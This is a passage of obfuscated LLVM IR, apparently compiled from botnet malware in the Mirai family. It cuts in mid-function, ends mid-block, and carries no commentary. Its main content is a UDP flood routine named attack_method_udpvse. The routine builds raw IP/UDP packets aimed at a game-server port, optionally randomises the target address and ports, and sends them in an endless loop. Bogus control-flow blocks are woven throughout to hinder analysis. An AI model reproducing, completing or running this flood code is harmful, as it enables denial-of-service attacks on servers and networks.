  %521 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %520, i64 1
  %522 = bitcast %struct.iphdr* %521 to %struct.udphdr*
  store %struct.udphdr* %522, %struct.udphdr** %25, align 8
  %523 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %524 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %523, i64 1
  %525 = bitcast %struct.udphdr* %524 to i8*
  store i8* %525, i8** %26, align 8
  %526 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %527 = load i32, i32* %9, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %526, i64 %528
  %530 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %529, i32 0, i32 2
  %531 = load i8, i8* %530, align 4
  %532 = zext i8 %531 to i32
  %533 = icmp slt i32 %532, 32
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %339
  %534 = load i16, i16* %13, align 2
  %535 = zext i16 %534 to i32
  %536 = icmp eq i32 %535, 65535
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %440
  br label %originalBB61
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #7
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #7
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %75

; <label>:58:                                     ; preds = %4
  %59 = load i32, i32* @x.33
  %60 = load i32, i32* @y.34
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  %67 = load i32, i32* @x.33
  %68 = load i32, i32* @y.34
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %400

; <label>:75:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %76 = load i32, i32* %10, align 4
  %77 = bitcast i32* %9 to i8*
  %78 = call i32 @setsockopt(i32 %76, i32 0, i32 3, i8* %77, i32 4) #7
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %80, label %83

; <label>:80:                                     ; preds = %75
  %81 = load i32, i32* %10, align 4
  %82 = call i32 @close(i32 %81)
  br label %400

; <label>:83:                                     ; preds = %75
  store i32 0, i32* %9, align 4
  br label %84

; <label>:84:                                     ; preds = %originalBBpart220, %83
  %85 = load i32, i32* %9, align 4
  %86 = load i8, i8* %5, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp slt i32 %85, %87
  br i1 %88, label %89, label %211

; <label>:89:                                     ; preds = %84
  %90 = call noalias i8* @calloc(i64 128, i64 1) #7
  %91 = load i8**, i8*** %11, align 8
  %92 = load i32, i32* %9, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8*, i8** %91, i64 %93
  store i8* %90, i8** %94, align 8
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  %99 = load i8*, i8** %98, align 8
  %100 = bitcast i8* %99 to %struct.iphdr*
  store %struct.iphdr* %100, %struct.iphdr** %20, align 8
  %101 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i64 1
  %103 = bitcast %struct.iphdr* %102 to %struct.udphdr*
  store %struct.udphdr* %103, %struct.udphdr** %21, align 8
  %104 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %105 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %104, i64 1
  %106 = bitcast %struct.udphdr* %105 to i8*
  store i8* %106, i8** %22, align 8
  %107 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %108 = bitcast %struct.iphdr* %107 to i8*
  %109 = load i8, i8* %108, align 4
  %110 = and i8 %109, 15
  %111 = or i8 %110, 64
  store i8 %111, i8* %108, align 4
  %112 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %113 = bitcast %struct.iphdr* %112 to i8*
  %114 = load i8, i8* %113, align 4
  %115 = and i8 %114, -16
  %116 = or i8 %115, 5
  store i8 %116, i8* %113, align 4
  %117 = load i8, i8* %12, align 1
  %118 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i32 0, i32 1
  store i8 %117, i8* %119, align 1
  %120 = load i32, i32* %19, align 4
  %121 = sext i32 %120 to i64
  %122 = add i64 32, %121
  %123 = trunc i64 %122 to i16
  %124 = call zeroext i16 @htons(i16 zeroext %123) #8
  %125 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 2
  store i16 %124, i16* %126, align 2
  %127 = load i16, i16* %13, align 2
  %128 = call zeroext i16 @htons(i16 zeroext %127) #8
  %129 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 3
  store i16 %128, i16* %130, align 4
  %131 = load i8, i8* %14, align 1
  %132 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 5
  store i8 %131, i8* %133, align 4
  %134 = load i8, i8* %15, align 1
  %135 = icmp ne i8 %134, 0
  br i1 %135, label %136, label %140

; <label>:136:                                    ; preds = %89
  %137 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %138 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 4
  store i16 %137, i16* %139, align 2
  br label %140

; <label>:140:                                    ; preds = %136, %89
  %141 = load i32, i32* @x.33
  %142 = load i32, i32* @y.34
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %140
  %149 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 6
  store i8 17, i8* %150, align 1
  %151 = load i32, i32* @LOCAL_ADDR, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 8
  store i32 %151, i32* %153, align 4
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 1
  %159 = load i32, i32* %158, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 9
  store i32 %159, i32* %161, align 4
  %162 = load i16, i16* %16, align 2
  %163 = call zeroext i16 @htons(i16 zeroext %162) #8
  %164 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %165 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %164, i32 0, i32 0
  store i16 %163, i16* %165, align 2
  %166 = load i16, i16* %17, align 2
  %167 = call zeroext i16 @htons(i16 zeroext %166) #8
  %168 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %169 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %168, i32 0, i32 1
  store i16 %167, i16* %169, align 2
  %170 = load i32, i32* %19, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 12, %171
  %173 = trunc i64 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #8
  %175 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = load i8*, i8** %22, align 8
  %178 = bitcast i8* %177 to i32*
  store i32 -1, i32* %178, align 4
  %179 = load i8*, i8** %22, align 8
  %180 = getelementptr inbounds i8, i8* %179, i64 4
  store i8* %180, i8** %22, align 8
  %181 = load i8*, i8** %22, align 8
  %182 = load i8*, i8** %18, align 8
  %183 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %181, i8* %182, i32 %183)
  %184 = load i32, i32* @x.33
  %185 = load i32, i32* @y.34
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %192

; <label>:192:                                    ; preds = %originalBBpart24
  %193 = load i32, i32* @x.33
  %194 = load i32, i32* @y.34
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %192
  %201 = load i32, i32* %9, align 4
  %202 = add nsw i32 %201, 1
  store i32 %202, i32* %9, align 4
  %203 = load i32, i32* @x.33
  %204 = load i32, i32* @y.34
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBBpart220, label %originalBB6alteredBB

originalBBpart220:                                ; preds = %originalBB6
  br label %84

; <label>:211:                                    ; preds = %84
  br label %212

; <label>:212:                                    ; preds = %399, %211
  store i32 0, i32* %9, align 4
  br label %213

; <label>:213:                                    ; preds = %396, %212
  %214 = load i32, i32* %9, align 4
  %215 = load i8, i8* %5, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp slt i32 %214, %216
  br i1 %217, label %218, label %399

; <label>:218:                                    ; preds = %213
  %219 = load i8**, i8*** %11, align 8
  %220 = load i32, i32* %9, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds i8*, i8** %219, i64 %221
  %223 = load i8*, i8** %222, align 8
  store i8* %223, i8** %23, align 8
  %224 = load i8*, i8** %23, align 8
  %225 = bitcast i8* %224 to %struct.iphdr*
  store %struct.iphdr* %225, %struct.iphdr** %24, align 8
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i64 1
  %228 = bitcast %struct.iphdr* %227 to %struct.udphdr*
  store %struct.udphdr* %228, %struct.udphdr** %25, align 8
  %229 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %230 = load i32, i32* %9, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i32 0, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = zext i8 %234 to i32
  %236 = icmp slt i32 %235, 32
  br i1 %236, label %237, label %274

; <label>:237:                                    ; preds = %218
  %238 = load i32, i32* @x.33
  %239 = load i32, i32* @y.34
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %237
  %246 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %247 = load i32, i32* %9, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %246, i64 %248
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %249, i32 0, i32 1
  %251 = load i32, i32* %250, align 4
  %252 = call i32 @ntohl(i32 %251) #8
  %253 = call i32 @rand_next()
  %254 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %255 = load i32, i32* %9, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i64 %256
  %258 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %257, i32 0, i32 2
  %259 = load i8, i8* %258, align 4
  %260 = zext i8 %259 to i32
  %261 = lshr i32 %253, %260
  %262 = add i32 %252, %261
  %263 = call i32 @htonl(i32 %262) #8
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 9
  store i32 %263, i32* %265, align 4
  %266 = load i32, i32* @x.33
  %267 = load i32, i32* @y.34
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart245, label %originalBB22alteredBB

originalBBpart245:                                ; preds = %originalBB22
  br label %274

; <label>:274:                                    ; preds = %originalBBpart245, %218
  %275 = load i32, i32* @x.33
  %276 = load i32, i32* @y.34
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %274
  %283 = load i16, i16* %13, align 2
  %284 = zext i16 %283 to i32
  %285 = icmp eq i32 %284, 65535
  %286 = load i32, i32* @x.33
  %287 = load i32, i32* @y.34
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br i1 %285, label %294, label %315

; <label>:294:                                    ; preds = %originalBBpart249
  %295 = load i32, i32* @x.33
  %296 = load i32, i32* @y.34
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %294
  %303 = call i32 @rand_next()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 3
  store i16 %304, i16* %306, align 4
  %307 = load i32, i32* @x.33
  %308 = load i32, i32* @y.34
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %315

; <label>:315:                                    ; preds = %originalBBpart253, %originalBBpart249
  %316 = load i16, i16* %16, align 2
  %317 = zext i16 %316 to i32
  %318 = icmp eq i32 %317, 65535
  br i1 %318, label %319, label %340

; <label>:319:                                    ; preds = %315
  %320 = load i32, i32* @x.33
  %321 = load i32, i32* @y.34
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %319
  %328 = call i32 @rand_next()
  %329 = trunc i32 %328 to i16
  %330 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 0
  store i16 %329, i16* %331, align 2
  %332 = load i32, i32* @x.33
  %333 = load i32, i32* @y.34
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %340

; <label>:340:                                    ; preds = %originalBBpart257, %315
  %341 = load i16, i16* %17, align 2
  %342 = zext i16 %341 to i32
  %343 = icmp eq i32 %342, 65535
  br i1 %343, label %344, label %349

; <label>:344:                                    ; preds = %340
  %345 = call i32 @rand_next()
  %346 = trunc i32 %345 to i16
  %347 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 1
  store i16 %346, i16* %348, align 2
  br label %349

; <label>:349:                                    ; preds = %344, %340
  %350 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 7
  store i16 0, i16* %351, align 2
  %352 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %353 = bitcast %struct.iphdr* %352 to i16*
  %354 = call zeroext i16 @checksum_generic(i16* %353, i32 20)
  %355 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 7
  store i16 %354, i16* %356, align 2
  %357 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %358 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %357, i32 0, i32 3
  store i16 0, i16* %358, align 2
  %359 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %360 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %361 = bitcast %struct.udphdr* %360 to i8*
  %362 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %363 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %362, i32 0, i32 2
  %364 = load i16, i16* %363, align 2
  %365 = load i32, i32* %19, align 4
  %366 = sext i32 %365 to i64
  %367 = add i64 12, %366
  %368 = trunc i64 %367 to i32
  %369 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %359, i8* %361, i16 zeroext %364, i32 %368)
  %370 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 3
  store i16 %369, i16* %371, align 2
  %372 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %373 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %372, i32 0, i32 1
  %374 = load i16, i16* %373, align 2
  %375 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i32 0, i32 0
  %380 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %379, i32 0, i32 1
  store i16 %374, i16* %380, align 2
  %381 = load i32, i32* %10, align 4
  %382 = load i8*, i8** %23, align 8
  %383 = load i32, i32* %19, align 4
  %384 = sext i32 %383 to i64
  %385 = add i64 32, %384
  %386 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %387 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %388 = load i32, i32* %9, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i64 %389
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i32 0, i32 0
  %392 = bitcast %struct.sockaddr_in* %391 to %struct.sockaddr*
  store %struct.sockaddr* %392, %struct.sockaddr** %386, align 8
  %393 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %394 = load %struct.sockaddr*, %struct.sockaddr** %393, align 8
  %395 = call i64 @sendto(i32 %381, i8* %382, i64 %385, i32 16384, %struct.sockaddr* %394, i32 16)
  br label %396

; <label>:396:                                    ; preds = %349
  %397 = load i32, i32* %9, align 4
  %398 = add nsw i32 %397, 1
  store i32 %398, i32* %9, align 4
  br label %213

; <label>:399:                                    ; preds = %213
  br label %212

; <label>:400:                                    ; preds = %80, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %58
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %140
  %401 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 6
  store i8 17, i8* %402, align 1
  %403 = load i32, i32* @LOCAL_ADDR, align 4
  %404 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 8
  store i32 %403, i32* %405, align 4
  %406 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 1
  %411 = load i32, i32* %410, align 4
  %412 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 9
  store i32 %411, i32* %413, align 4
  %414 = load i16, i16* %16, align 2
  %415 = call zeroext i16 @htons(i16 zeroext %414) #8
  %416 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i32 0, i32 0
  store i16 %415, i16* %417, align 2
  %418 = load i16, i16* %17, align 2
  %419 = call zeroext i16 @htons(i16 zeroext %418) #8
  %420 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %421 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %420, i32 0, i32 1
  store i16 %419, i16* %421, align 2
  %422 = load i32, i32* %19, align 4
  %423 = sext i32 %422 to i64
  %_ = sub i64 0, 12
  %gen = add i64 %_, %423
  %_2 = shl i64 12, %423
  %424 = add i64 12, %423
  %425 = trunc i64 %424 to i16
  %426 = call zeroext i16 @htons(i16 zeroext %425) #8
  %427 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %428 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %427, i32 0, i32 2
  store i16 %426, i16* %428, align 2
  %429 = load i8*, i8** %22, align 8
  %430 = bitcast i8* %429 to i32*
  store i32 -1, i32* %430, align 4
  %431 = load i8*, i8** %22, align 8
  %432 = getelementptr inbounds i8, i8* %431, i64 4
  store i8* %432, i8** %22, align 8
  %433 = load i8*, i8** %22, align 8
  %434 = load i8*, i8** %18, align 8
  %435 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %433, i8* %434, i32 %435)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %192
  %436 = load i32, i32* %9, align 4
  %_7 = sub i32 0, %436
  %gen8 = add i32 %_7, 1
  %_9 = sub i32 0, %436
  %gen10 = add i32 %_9, 1
  %_11 = shl i32 %436, 1
  %_12 = shl i32 %436, 1
  %_13 = sub i32 0, %436
  %gen14 = add i32 %_13, 1
  %_15 = sub i32 0, %436
  %gen16 = add i32 %_15, 1
  %_17 = sub i32 0, %436
  %gen18 = add i32 %_17, 1
  %437 = add nsw i32 %436, 1
  store i32 %437, i32* %9, align 4
  br label %originalBB6

originalBB22alteredBB:                            ; preds = %originalBB22, %237
  %438 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %439 = load i32, i32* %9, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %438, i64 %440
  %442 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i32 0, i32 1
  %443 = load i32, i32* %442, align 4
  %444 = call i32 @ntohl(i32 %443) #8
  %445 = call i32 @rand_next()
  %446 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %447 = load i32, i32* %9, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i64 %448
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %449, i32 0, i32 2
  %451 = load i8, i8* %450, align 4
  %452 = zext i8 %451 to i32
  %_23 = sub i32 0, %445
  %gen24 = add i32 %_23, %452
  %_25 = sub i32 %445, %452
  %gen26 = mul i32 %_25, %452
  %_27 = shl i32 %445, %452
  %453 = lshr i32 %445, %452
  %_28 = sub i32 %444, %453
  %gen29 = mul i32 %_28, %453
  %_30 = sub i32 0, %444
  %gen31 = add i32 %_30, %453
  %_32 = sub i32 %444, %453
  %gen33 = mul i32 %_32, %453
  %_34 = sub i32 %444, %453
  %gen35 = mul i32 %_34, %453
  %_36 = shl i32 %444, %453
  %_37 = shl i32 %444, %453
  %_38 = sub i32 0, %444
  %gen39 = add i32 %_38, %453
  %_40 = shl i32 %444, %453
  %_41 = sub i32 0, %444
  %gen42 = add i32 %_41, %453
  %_43 = shl i32 %444, %453
  %454 = add i32 %444, %453
  %455 = call i32 @htonl(i32 %454) #8
  %456 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 9
  store i32 %455, i32* %457, align 4
  br label %originalBB22

originalBB47alteredBB:                            ; preds = %originalBB47, %274
  %458 = load i16, i16* %13, align 2
  %459 = zext i16 %458 to i32
  %460 = icmp eq i32 %459, 65535
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %294
  %461 = call i32 @rand_next()
  %462 = trunc i32 %461 to i16
  %463 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 3
  store i16 %462, i16* %464, align 4
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %319
  %465 = call i32 @rand_next()
  %466 = trunc i32 %465 to i16
  %467 = load %struct.udphdr*, %struct.udphdr** %25, align 8
